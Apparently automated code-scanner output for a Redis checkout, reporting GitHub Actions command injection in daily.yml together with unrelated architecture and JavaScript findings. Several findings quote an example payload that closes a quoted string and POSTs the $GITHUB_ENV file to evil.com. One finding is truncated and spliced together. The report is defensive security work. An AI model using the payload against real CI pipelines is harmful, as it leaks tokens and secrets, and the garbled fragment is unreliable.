findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/daily.yml`
**Line**: 44

**Vulnerable pattern detected**: `${{ github.event.inputs.use_repo }}`

**Code**:
```yaml
echo "GITHUB_REPOSITORY=${{github.event.inputs.use_repo}}" >> $GITHUB_ENV
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.use_repo }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
findings.why_it_matters: Command injection in CI/CD pipelines can lead to complete repository compromise, secrets theft, and supply chain attacks affecting all users of your software.

findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/daily.yml`
**Line**: 86

**Vulnerable pattern detected**: `${{ github.event.inputs.cluster_test_args }}`

**Code**:
```yaml
echo "cluster_test_args: ${{github.event.inputs.cluster_test_args}}"
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.cluster_test_args }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):
   ```yaml
   - uses: actions/github-script@v7
     with:
       script: |
         const title = context.payload.pull_request.title;
         // Process safely in JavaScript
   ```

**References**:
- https://securitylab.github.com/research/github-actions-untrusted-input/
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions

findings.title: GitHub Actions Command Injection (Workflow Input)

```yaml
echo "GITHUB_HEAD_REF=${{github.event.inputs.use_git_ref}}" >> $GITHUB_ENV
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**

   ```yaml
   - name: Safe handling
   ```

findings.title: GitHub Actions Command Injection (Workflow Input)
findings.description:
**Critical: Command Injection in GitHub Actions Workflow**

**File**: `.github/workflows/daily.yml`
**Line**: 219

**Vulnerable pattern detected**: `${{ github.event.inputs.test_args }}`

**Code**:
```yaml
--dump-logs ${{github.event.inputs.test_args}}
```

This workflow interpolates user-controlled input directly into a shell command.
An attacker can exploit this to execute arbitrary commands in your CI environment.

**Attack vector**:
- For PRs: Attacker opens a PR with a malicious title/branch name
- For issues: Attacker creates an issue with a malicious title/body
- For comments: Attacker posts a comment with shell injection payload

**Example attack payload** (in PR title):
```
"; curl -X POST -d @$GITHUB_ENV http://evil.com; #
```

This can lead to:
- **Secrets exfiltration**: GITHUB_TOKEN, AWS keys, API tokens
- **Supply chain attacks**: Malicious code pushed to main branch
- **Lateral movement**: Access to other repositories via GITHUB_TOKEN
- **Complete repository compromise**
findings.suggested_fix:
**Recommended fixes**:

1. **Use an intermediate environment variable** (preferred):
   ```yaml
   - name: Safe handling
     env:
       TITLE: ${{ github.event.inputs.test_args }}
     run: |
       echo "Title: $TITLE"
   ```

2. **Use GitHub Script action** (for complex logic):

findings.title: Structural bridge: `/tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/redis/deps/fast_float/fast_float.h::bigint::add:2996` separates components of [7518, 153]
findings.description: `/tmp/nix-shell-540336-2497635915/tmp.zZnau8nCIx/redis/deps/fast_float/fast_float.h::bigint::add:2996` is a structural bridge. Removing it would split the graph into components of sizes [7518, 153]. All communication between these components currently flows through this single node.
findings.suggested_fix: Reduce coupling through this node by introducing alternative call paths, extracting shared interfaces, or splitting the bridge function into independently accessible units.
findings.why_it_matters: A structural bridge is a single node whose failure disconnects entire subsystems. This creates fragile architecture where a bug, API change, or refactor in one function can cascade to all dependent components.

📦 In function: `validate_schema` (0 callers)

findings.why_it_matters:
Type coercion in == can cause unexpected behavior:
• '1' == 1 is true
• '' == false is true
• [] == false is true
Use === to compare both value AND type.
